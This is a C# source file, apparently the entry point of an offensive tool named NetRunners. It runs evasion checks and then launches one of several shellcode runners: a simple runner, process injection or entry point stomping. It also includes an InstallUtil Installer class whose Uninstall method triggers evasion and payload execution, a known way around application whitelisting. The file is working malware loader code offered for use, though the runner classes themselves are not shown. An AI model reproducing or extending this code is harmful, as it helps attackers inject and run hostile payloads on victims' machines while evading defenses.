using System;
using NetRunners.Interfaces;
using NetRunners.Runners;

namespace NetRunners.Exe
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Heurisitic functions, and then parses through arguments to determine which runner to call.
        /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
        /// </summary>
        /// <param name="/pi">Calls Process Injection Runner. Case Insensitive</param>
        /// <param name="/eps">Calls EntryPoint Stomping Runner. Case Insensitive</param>
        static void Main(string[] args)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();

            // execute runner
            IRunner runner = DetermineRunner(args);
            runner?.Run();
        }
        // Determine the function call based on the argument provided, case insensitive
        static IRunner DetermineRunner(string[] args)
        {
            string call = args.Length == 1 ? args[0].ToLower() : string.Empty;
            switch (call)
            {
                case "-pi":
                    return new ProcessInjectionRunner();
                case "-eps":
                    return new EntryPointStompingRunner();
                default:
                    return new DefaultRunner();
            }
        }
    }
    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformChecks();
            // execution
            NetRunners.Helpers.Helper.SelectRunner();
        }
    }
}
